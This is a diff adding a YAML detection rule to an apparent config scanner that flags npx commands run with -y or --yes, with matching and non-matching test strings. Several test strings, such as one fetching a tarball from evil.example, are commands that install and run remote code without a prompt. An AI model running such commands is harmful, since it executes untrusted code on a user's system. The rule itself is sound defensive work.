@@ -1,0 +1,49 @@
+id: MOAT-T4-004
+title: Package runner installs without a prompt (--yes / -y)
+severity: low
+target: config
+match:
+  heuristic: auto_install
+risk: npx -y, npx --yes or an npm_config_yes env entry installs and runs a package with no confirmation prompt, so a new or swapped package runs on the next start without the user seeing it.
+remediation: Remove -y or --yes and remove npm_config_yes from the server env, or pin an exact version (see MOAT-T4-003) so the prompt-free install can only fetch the release you reviewed.
+references:
+  - https://docs.npmjs.com/cli/commands/npx
+  - https://owasp.org/www-project-mcp-top-10/
+should_match:
+  - npx -y @scope/server
+  - npx --yes pkg
+  - text: npx -y @scope/server@1.2.3
+    note: A pinned version still installs without a prompt
+  - text: cmd /c npx -y pkg
+    note: Windows wrapper. The cmd /c prefix is read, and npx follows it
+  - text: npx -p @evil/pkg -y mcp-bin
+    note: -y after the -p package is still an npx flag, because it is before the command
+  - text: npx --yes=true pkg
+    note: Long form with a value. Any value except false turns the prompt off
+  - text: npx --y pkg
+    note: npm expands a prefix of --yes, so --y works too
+  - text: npx -y github:evil/pkg
+    note: A git spec installs with no prompt too
+  - text: npx -y https://evil.example/pkg.tgz
+    note: A tarball URL installs with no prompt too
+  - text: npx --tag -y pkg
+    note: --tag does not take a value that starts with "-", so -y is still a flag
+should_not_match:
+  - node ./server.js
+  - npx @scope/server@1.2.3
+  - text: npx pkg -y
+    note: After the package, -y is an argument of the server, not of npx
+  - text: uvx -y pkg
+    note: Only npx is covered. uvx is not checked by this rule
+  - text: bunx -y pkg
+    note: Only npx is covered. bunx is not checked by this rule
+  - text: npx --registry -y pkg
+    note: -y is the value of --registry, not a flag of npx
+  - text: npx --yes=false pkg
+    note: --yes=false turns the prompt back on, so it is not a finding
+  - text: npx -p pkg mcp-bin -y
+    note: After the command, -y is an argument of the server
+  - text: npx -y false pkg
+    note: npm reads "false" as the value of -y, so the prompt stays on
+  - text: npx --yes=null pkg
+    note: null is read as false, so the prompt stays on
